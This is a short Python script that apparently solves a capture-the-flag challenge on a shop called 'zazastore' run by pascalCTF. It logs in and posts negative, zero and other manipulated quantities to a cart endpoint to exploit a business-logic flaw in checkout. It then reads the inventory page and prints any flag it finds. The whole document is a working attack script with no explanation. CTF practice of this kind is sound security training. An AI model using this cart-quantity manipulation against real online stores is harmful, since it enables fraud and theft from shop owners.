#!/usr/bin/env python3
import requests
import json
import re

URL = "https://zazastore.ctf.pascalctf.it" 

def exploit():
    s = requests.Session()
    
    print("login")
    login_data = {"username": "hacker", "password": "hacker"}
    r = s.post(f"{URL}/login", data=login_data)
    
    
    print("\nAdd RealZa")
    cart_data = {"product": "RealZa", "quantity": 10}
    r = s.post(f"{URL}/add-cart", json=cart_data)
    print(f"    Response: {r.json()}")
    
   
    print("\n NaN")
    cart_data = {"product": "FlagZa", "quantity": 1}
    r = s.post(f"{URL}/add-cart", json=cart_data)
    print(f"    Response: {r.json()}")
    
 
    print("\n-1")
    cart_data = {"product": "RealZa", "quantity": -1}
    r = s.post(f"{URL}/add-cart", json=cart_data)
    print(f"    Response: {r.json()}")
    
    print("\n0")
    cart_data = {"product": "RealZa", "quantity": 0}
    r = s.post(f"{URL}/add-cart", json=cart_data)
    print(f"    Response: {r.json()}")
    
    print("\ncheckout")
    r = s.post(f"{URL}/checkout")
    print(f"    Checkout response: {r.json()}")
    
    print("\ninventory")
    r = s.get(f"{URL}/inventory")
    print(f"    Status: {r}")
    
    print(r.text)
    if "pascalCTF{" in r.text:
        flags = re.findall(r'pascalCTF\{[^}]+\}', r.text)
        for flag in flags:
            print(f"Flag: {flag}")
    else:
        print("oh nao")

if __name__ == "__main__":
    exploit()